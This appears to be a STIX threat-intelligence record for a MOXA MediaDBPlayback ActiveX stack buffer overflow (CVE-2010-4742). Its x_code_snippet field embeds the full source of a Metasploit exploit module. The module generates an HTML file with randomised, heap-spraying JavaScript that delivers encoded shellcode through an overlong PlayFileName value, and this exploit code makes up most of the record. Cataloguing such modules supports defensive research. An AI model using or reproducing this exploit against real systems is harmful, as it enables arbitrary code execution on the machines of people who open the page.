{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f79506b4-ed31-4fb3-b1e9-f0e483a81d50",
    "created": "2024-08-14T16:36:22.397866Z",
    "modified": "2024-08-14T16:36:22.39787Z",
    "name": "MOXA MediaDBPlayback ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in MOXA_ActiveX_SDK. When sending an overly long string to the PlayFileName() of MediaDBPlayback.DLL (2.2.0.5) an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/moxa_mediadbplayback.rb",
            "external_id": "moxa_mediadbplayback.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4742"
        },
        {
            "source_name": "reference",
            "url": "http://www.moxa.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MOXA MediaDBPlayback ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in MOXA_ActiveX_SDK. When\n        sending an overly long string to the PlayFileName() of MediaDBPlayback.DLL (2.2.0.5)\n        an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-4742' ],\n          [ 'OSVDB', '68986'],\n          [ 'URL', 'http://www.moxa.com' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0a0a0a0a } ]\n        ],\n      'DisclosureDate' => '2010-10-19',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.',  'msf.html']),\n      ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret     = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n<html>\n<object id ='#{vname}' classid='clsid:5B32067A-121B-49DE-8182-91EB13DDF8D6'></object>\n<script language =\"javascript\">\nvar #{rand1} = unescape('#{shellcode}');\nvar #{rand2} = unescape('#{nops}');\nvar #{rand3} = 20;\nvar #{rand4} = #{rand3} + #{rand1}.length;\nwhile (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\nvar #{rand5} = #{rand2}.substring(0,#{rand4});\nvar #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\nwhile (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\nvar #{rand7} = new Array();\nfor (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\nvar #{rand8} = \"\";\nfor (#{var_i} = 0; #{var_i} < 14500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n#{vname}.PlayFileName = #{rand8};\n</script>\n</html>\n    |\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(content)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-19",
    "x_mitre_platforms": [
        "win'"
    ]
}